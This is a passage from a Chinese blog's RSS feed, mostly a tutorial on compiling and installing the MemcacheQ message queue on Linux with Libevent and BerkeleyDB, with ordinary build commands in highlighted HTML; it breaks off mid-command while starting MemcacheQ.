 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(255, 0, 0);'><a title='完整思路下载' href='http://files.cnblogs.com/AloneSword/MySQL%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E6%80%9D%E8%B7%AF.zip' style='color:rgb(52, 104, 164);'><span style='color:rgb(255, 0, 0);'>&nbsp;完整说明及文件下载</span></a></span></p> 
]]></description>
	<pubDate>Wed, 08 Apr 2015 22:00:00 +0000</pubDate>
	<author>迷茫者</author>
	<guid>http://onelose.com/post-211.html</guid>

</item>
<item>
	<title>开源消息队列MemcacheQ在Linux中编译安装教程</title>
	<link>http://onelose.com/post-209.html</link>
	<description><![CDATA[
 <div> 
 <h1 style='background-color:rgb(255, 255, 255);color:rgb(85, 85, 85);font-family:'Open Sans', sans-serif;font-size:36px;font-style:normal;text-align:start;'><p style='background-color: rgb(255, 255, 255); font-size: 18px; font-weight: normal;'>队列（Queue）是一种常用的数据结构。在队列这种数据结构中，最先插入的元素将会最先被取出；反之最后插入的元素将会最后被取出，因此队列又称为“先进先出”（FIFO：First In First Out）的线性表。</p><p style='background-color: rgb(255, 255, 255); font-size: 18px; font-weight: normal;'>加入元素的一端叫“队尾”，取出元素的一端叫“队头”。利用消息队列可以很好地异步处理数据的传送和存储，当遇到频繁且密集地向后端数据库中插入数据时，就可采用消息队列来异步处理这些数据写入。</p><p style='background-color: rgb(255, 255, 255); font-size: 18px; font-weight: normal;'>MemcacheQ是一款基于Memcache协议的开源消息队列服务软件，由于其遵循了Memcache协议，因此开发成本很低，不需要学习额外的知识便可轻松掌握。</p><p style='background-color: rgb(255, 255, 255); font-size: 18px; font-weight: normal;'>我在最近的一个项目中也应用了MemcacheQ，下面我将分享一下MemcacheQ在Linux中的编译和安装过程。</p><p style='background-color: rgb(255, 255, 255); font-size: 18px; font-weight: normal;'>首先，MemcacheQ依赖于BerkeleyDB和Libevent，如果服务器中曾经安装过Memcached，那么Libevent应该已经存在了，否则就需要先下载安装Libevent。</p><p style='background-color: rgb(255, 255, 255); font-size: 18px; font-weight: normal;'>下载链接如下：</p><p style='background-color: rgb(255, 255, 255); font-size: 18px; font-weight: normal;'>Libevent：<a title='https://github.com/downloads/libevent/libevent/libevent-2.0.21-stable.tar.gz' href='https://github.com/downloads/libevent/libevent/libevent-2.0.21-stable.tar.gz' target='_blank' style='color:rgb(60, 99, 154);'>https://github.com/downloads/libevent/libevent/libevent-2.0.21-stable.tar.gz</a><br>Berkeley DB：<a title='http://download.oracle.com/otn/berkeley-db/db-6.0.30.tar.gz' href='http://download.oracle.com/otn/berkeley-db/db-6.0.30.tar.gz' target='_blank' style='color:rgb(60, 99, 154);'>http://download.oracle.com/otn/berkeley-db/db-6.0.30.tar.gz</a><br>MemcacheQ：<a title='https://github.com/stvchu/memcacheq' href='https://github.com/stvchu/memcacheq' target='_blank' style='color:rgb(60, 99, 154);'>https://github.com/stvchu/memcacheq</a></p><p style='background-color: rgb(255, 255, 255); font-size: 18px; font-weight: normal;'>安装Libevent</p> 
  <div data-settings=' minimize scroll-mouseover disable-anim' style='font-family: Monaco, MonacoRegular, 'Courier New', monospace; font-weight: 500; background-color: rgb(253, 253, 253) !important; font-size: 12px !important;'> 
   <div data-settings=' show' style='background-color: rgb(221, 221, 221) !important;'> 
    <div style='font-family: inherit;'> 
     <span style='font-family: inherit; color: rgb(153, 153, 153) !important; font-size: inherit !important;'>Shell</span> 
    </div> 
   </div> 
   <div> 
    <table border='1' cellpadding='2' cellspacing='0' style='font-size: 12px;'> 
     <tbody> 
      <tr> 
       <td data-settings='show' style='background-color: rgb(223, 239, 255) !important; color: rgb(84, 153, 222) !important;'> 
        <div> 
         <div data-line='crayon-5525edf2dcb4a606036639-1' style='font-family: inherit; text-align: center; font-size: inherit !important;'>
           1 
         </div> 
         <div data-line='crayon-5525edf2dcb4a606036639-2' style='font-family: inherit; text-align: center; background-color: rgb(200, 225, 250) !important; color: rgb(49, 124, 197) !important; font-size: inherit !important;'>
           2 
         </div> 
         <div data-line='crayon-5525edf2dcb4a606036639-3' style='font-family: inherit; text-align: center; font-size: inherit !important;'>
           3 
         </div> 
         <div data-line='crayon-5525edf2dcb4a606036639-4' style='font-family: inherit; text-align: center; background-color: rgb(200, 225, 250) !important; color: rgb(49, 124, 197) !important; font-size: inherit !important;'>
           4 
         </div> 
         <div data-line='crayon-5525edf2dcb4a606036639-5' style='font-family: inherit; text-align: center; font-size: inherit !important;'>
           5 
         </div> 
         <div data-line='crayon-5525edf2dcb4a606036639-6' style='font-family: inherit; text-align: center; background-color: rgb(200, 225, 250) !important; color: rgb(49, 124, 197) !important; font-size: inherit !important;'>
           6 
         </div> 
        </div></td> 
       <td style='width: 680px;'> 
        <div> 
         <div style='font-family: inherit; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>tar </span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>zvxf </span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>libevent</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(206, 0, 0) !important; font-size: inherit !important;'>2.0.21</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>stable</span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>.tar</span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>.gz</span> 
         </div> 
         <div style='font-family: inherit; background-color: rgb(247, 247, 247) !important; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>cd</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>libevent</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(206, 0, 0) !important; font-size: inherit !important;'>2.0.21</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; font-size: inherit !important;'>stable</span> 
         </div> 
         <div style='font-family: inherit; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>.</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>configure</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>--</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>prefix</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>=</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>usr</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>local</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>libevent</span> 
         </div> 
         <div style='font-family: inherit; background-color: rgb(247, 247, 247) !important; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>make</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&amp;&amp;</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>make</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>install</span> 
         </div> 
         <div style='font-family: inherit; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>echo</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 128, 0) !important; font-size: inherit !important;'>'/usr/local/libevent/lib'</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&gt;&gt;</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>etc</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>ld</span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>.so</span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>.conf</span> 
         </div> 
         <div style='font-family: inherit; background-color: rgb(247, 247, 247) !important; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>ldconfig</span> 
         </div> 
        </div></td> 
      </tr> 
     </tbody> 
    </table> 
   </div> 
  </div><p style='background-color: rgb(255, 255, 255); font-size: 18px; font-weight: normal;'>安装BerkeleyDB</p><p style='background-color: rgb(255, 255, 255); font-size: 18px; font-weight: normal;'>BerkeleyDB简介：BerkeleyDB是一个开源的文件数据库，介于关系数据库与内存数据库之间，使用方式与内存数据库类似，它提供的是一系列直接访问数据库的函数，而不是像关系数据库那样需要网络通讯、SQL解析等步骤。</p><p style='background-color: rgb(255, 255, 255); font-size: 18px; font-weight: normal;'>MemcacheQ依赖BerkleyDB用于队列数据的持久化存储，以免在MemcacheQ意外崩溃或中断时，队列数据不会丢失。</p> 
  <div data-settings=' minimize scroll-mouseover disable-anim' style='font-family: Monaco, MonacoRegular, 'Courier New', monospace; font-weight: 500; background-color: rgb(253, 253, 253) !important; font-size: 12px !important;'> 
   <div data-settings=' show' style='background-color: rgb(221, 221, 221) !important;'> 
    <div style='font-family: inherit;'> 
     <span style='font-family: inherit; color: rgb(153, 153, 153) !important; font-size: inherit !important;'>Shell</span> 
    </div> 
   </div> 
   <div> 
    <table border='1' cellpadding='2' cellspacing='0' style='font-size: 12px;'> 
     <tbody> 
      <tr> 
       <td data-settings='show' style='background-color: rgb(223, 239, 255) !important; color: rgb(84, 153, 222) !important; height: 111.125px;'> 
        <div> 
         <div data-line='crayon-5525edf2dcb5e709646527-1' style='font-family: inherit; text-align: center; font-size: inherit !important;'>
           1 
         </div> 
         <div data-line='crayon-5525edf2dcb5e709646527-2' style='font-family: inherit; text-align: center; background-color: rgb(200, 225, 250) !important; color: rgb(49, 124, 197) !important; font-size: inherit !important;'>
           2 
         </div> 
         <div data-line='crayon-5525edf2dcb5e709646527-3' style='font-family: inherit; text-align: center; font-size: inherit !important;'>
           3 
         </div> 
         <div data-line='crayon-5525edf2dcb5e709646527-4' style='font-family: inherit; text-align: center; background-color: rgb(200, 225, 250) !important; color: rgb(49, 124, 197) !important; font-size: inherit !important;'>
           4 
         </div> 
         <div data-line='crayon-5525edf2dcb5e709646527-5' style='font-family: inherit; text-align: center; font-size: inherit !important;'>
           5 
         </div> 
         <div data-line='crayon-5525edf2dcb5e709646527-6' style='font-family: inherit; text-align: center; background-color: rgb(200, 225, 250) !important; color: rgb(49, 124, 197) !important; font-size: inherit !important;'>
           6 
         </div> 
         <div data-line='crayon-5525edf2dcb5e709646527-7' style='font-family: inherit; text-align: center; font-size: inherit !important;'>
           7 
         </div> 
        </div></td> 
       <td style='width: 680px; height: 111.125px;'> 
        <div> 
         <div style='font-family: inherit; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>tar </span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>zxvf </span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>db</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(206, 0, 0) !important; font-size: inherit !important;'>6.0.30.tar.gz</span> 
         </div> 
         <div style='font-family: inherit; background-color: rgb(247, 247, 247) !important; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>cd</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>db</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(206, 0, 0) !important; font-size: inherit !important;'>6.0.30</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>build</span> 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>_</span>unix 
         </div> 
         <div style='font-family: inherit; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>.</span> 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>.</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>dist</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>configure</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>--</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>prefix</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>=</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>usr</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>local</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>berkeleydb</span> 
         </div> 
         <div style='font-family: inherit; background-color: rgb(247, 247, 247) !important; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>make</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&amp;&amp;</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>make</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>install</span> 
         </div> 
         <div style='font-family: inherit; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>ln</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>s</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>usr</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>local</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>berkeleydb</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>lib</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>libdb</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(206, 0, 0) !important; font-size: inherit !important;'>6.0.so</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>usr</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>lib</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
         </div> 
         <div style='font-family: inherit; background-color: rgb(247, 247, 247) !important; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>echo</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 128, 0) !important; font-size: inherit !important;'>'/usr/local/berkeleydb/lib/'</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&gt;&gt;</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>etc</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>ld</span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>.so</span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>.conf</span> 
         </div> 
         <div style='font-family: inherit; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>ldconfig</span> 
         </div> 
        </div></td> 
      </tr> 
     </tbody> 
    </table> 
   </div> 
  </div><p style='background-color: rgb(255, 255, 255); font-size: 18px; font-weight: normal;'>安装MemcacheQ</p> 
  <div data-settings=' minimize scroll-mouseover disable-anim wrap' style='font-family: Monaco, MonacoRegular, 'Courier New', monospace; font-weight: 500; background-color: rgb(253, 253, 253) !important; font-size: 12px !important;'> 
   <div data-settings=' show' style='background-color: rgb(221, 221, 221) !important;'> 
    <div style='font-family: inherit;'> 
     <span style='font-family: inherit; color: rgb(153, 153, 153) !important; font-size: inherit !important;'>Shell</span> 
    </div> 
   </div> 
   <div> 
    <table border='1' cellpadding='2' cellspacing='0' style='font-size: 12px;'> 
     <tbody> 
      <tr> 
       <td data-settings='show' style='height: 81.125px; background-color: rgb(223, 239, 255) !important; color: rgb(84, 153, 222) !important;'> 
        <div> 
         <div data-line='crayon-5525edf2dcb65935455385-1' style='font-family: inherit; text-align: center; font-size: inherit !important;'>
           1 
         </div> 
         <div data-line='crayon-5525edf2dcb65935455385-2' style='font-family: inherit; text-align: center; background-color: rgb(200, 225, 250) !important; color: rgb(49, 124, 197) !important; font-size: inherit !important;'>
           2 
         </div> 
         <div data-line='crayon-5525edf2dcb65935455385-3' style='font-family: inherit; text-align: center; font-size: inherit !important;'>
           3 
         </div> 
         <div data-line='crayon-5525edf2dcb65935455385-4' style='font-family: inherit; text-align: center; background-color: rgb(200, 225, 250) !important; color: rgb(49, 124, 197) !important; font-size: inherit !important;'>
           4 
         </div> 
        </div></td> 
       <td style='width: 680px; height: 81.125px;'> 
        <div> 
         <div style='font-family: inherit; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>tar </span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>zxvf </span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>memcacheq</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(206, 0, 0) !important; font-size: inherit !important;'>0.2.0.tar.gz</span> 
         </div> 
         <div style='font-family: inherit; background-color: rgb(247, 247, 247) !important; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>cd</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>memcacheq</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(206, 0, 0) !important; font-size: inherit !important;'>0.2.0</span> 
         </div> 
         <div style='font-family: inherit; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>.</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>configure</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>--</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>prefix</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>=</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>usr</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>local</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>memcacheq</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>--</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>with</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>bdb</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>=</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>usr</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>local</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>berkeleydb</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>--</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>with</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>libevent</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>=</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>usr</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>local</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>libevent</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>--</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>enable</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>threads</span> 
         </div> 
         <div style='font-family: inherit; background-color: rgb(247, 247, 247) !important; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>make</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&amp;&amp;</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>make</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>install</span> 
         </div> 
        </div></td> 
      </tr> 
     </tbody> 
    </table> 
   </div> 
  </div><p style='background-color: rgb(255, 255, 255); font-size: 18px; font-weight: normal;'>启动MemcacheQ</p> 
  <div data-settings=' minimize scroll-mouseover disable-anim wrap' style='font-family: Monaco, MonacoRegular, 'Courier New', monospace; font-weight: 500; background-color: rgb(253, 253, 253) !important; font-size: 12px !important;'> 
   <div data-settings=' show' style='background-color: rgb(221, 221, 221) !important;'> 
    <div style='font-family: inherit;'> 
     <span style='font-family: inherit; color: rgb(153, 153, 153) !important; font-size: inherit !important;'>Shell</span> 
    </div> 
   </div> 
   <div> 
    <table border='1' cellpadding='2' cellspacing='0' style='font-size: 12px;'> 
     <tbody> 
      <tr> 
       <td data-settings='show' style='background-color: rgb(223, 239, 255) !important; color: rgb(84, 153, 222) !important;'> 
        <div> 
         <div data-line='crayon-5525edf2dcb6b712632964-1' style='font-family: inherit; text-align: center; font-size: inherit !important;'>
           1 
         </div> 
        </div></td> 
       <td style='width: 680px;'> 
        <div> 
         <div style='font-family: inherit; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>usr</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>local</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>memcacheq</span> 
